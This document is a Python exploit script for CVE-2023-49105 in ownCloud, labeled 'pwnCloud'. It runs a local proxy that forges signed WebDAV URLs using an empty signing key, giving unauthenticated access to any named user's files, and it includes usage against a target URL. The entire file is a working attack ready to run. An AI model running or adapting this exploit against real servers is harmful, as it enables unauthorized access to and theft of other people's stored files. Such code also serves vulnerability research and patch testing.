#!/usr/bin/env python3
# Owncloud Privilege Escalation CVE-2023-49105 pwnCloud
# 2023-12-05
# cfreal
#
# DESCRIPTION
#
# Exploit demonstrating a consequence of CVE-2023-49105: arbitrary access to WEBDAV
# resources, including every file stored by a user.
#
# EXAMPLE
#
# $ ./pwncloud-webdav.py http://target.com/ admin
#
# REQUIREMENTS
#
# requires ten (https://github.com/cfreal/ten)
#

import hashlib
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

from ten import *
from tenlib.transform import url as turl


@entry
def main(url: str, username: str, listen: str = "localhost:8800") -> None:
    # Setup ProxyHandler
    ProxyHandler.session = ScopedSession(url)
    # ProxyHandler.session.burp()
    ProxyHandler.username = username

    # Display info
    msg_success(f"Proxy server running on {listen}")

    dav_url = f"dav://anonymous@{listen}/remote.php/dav"

    msg_info(f"Browse user files: {dav_url}/files/{username}")
    msg_info(f"Browse everything: {dav_url}")

    # Setup HTTP server
    listen_host, listen_port = listen.split(":")
    listen_port = int(listen_port)

    proxy_server = ThreadingHTTPServer((listen_host, listen_port), ProxyHandler)

    try:
        proxy_server.serve_forever()
    except KeyboardInterrupt:
        msg_failure("Shutting down the proxy server.")
        proxy_server.server_close()


class ProxyHandler(SimpleHTTPRequestHandler):
    session = ScopedSession
    username: str

    def do_ANY(self):
        # Fix bug where ownCloud does not realize /remote.php/dav is equal to
        # /remote.php/dav/ and raises an error
        if self.path == "/remote.php/dav":
            self.path += "/"

        # Add OC-* and signature to the URL
        url = build_signed_url(
            self.command, self.username, self.session.get_absolute_url(self.path)
        )

        # Prepare headers
        headers = {header: self.headers[header] for header in self.headers}
        headers["Host"] = turl.parse(url).netloc

        # TODO stream input
        if size := int(self.headers.get("Content-Length", 0)):
            data = self.rfile.read(size)
        else:
            data = None

        response = self.session.request(
            self.command, url, headers=headers, data=data, stream=True
        )

        self.send_response(response.status_code)

        for header, value in response.headers.items():
            self.send_header(header, value)

        self.end_headers()

        # Stream the response content to the client
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                self.wfile.write(chunk)

    do_OPTIONS = do_ANY
    do_GET = do_ANY
    do_HEAD = do_ANY
    do_POST = do_ANY
    do_PUT = do_ANY
    do_DELETE = do_ANY
    do_TRACE = do_ANY
    do_COPY = do_ANY
    do_LOCK = do_ANY
    do_MKCOL = do_ANY
    do_MOVE = do_ANY
    do_PROPFIND = do_ANY
    do_PROPPATCH = do_ANY
    do_UNLOCK = do_ANY


def compute_hash(url: str) -> str:
    url = url.encode()
    signing_key = "".encode()
    iterations = 10000
    return hashlib.pbkdf2_hmac("sha512", url, signing_key, iterations, dklen=32).hex()


def build_signed_url(method: str, username: str, url: str) -> str:
    parsed = turl.parse(url)
    params = qs.parse(parsed.query)
    params["OC-Credential"] = username
    params["OC-Verb"] = method
    params["OC-Expires"] = "1000"
    params["OC-Date"] = ""
    parsed = parsed._replace(query=qs.unparse(params))
    params["OC-Signature"] = compute_hash(turl.unparse(parsed))
    parsed = parsed._replace(query=qs.unparse(params))
    return turl.unparse(parsed)


main()
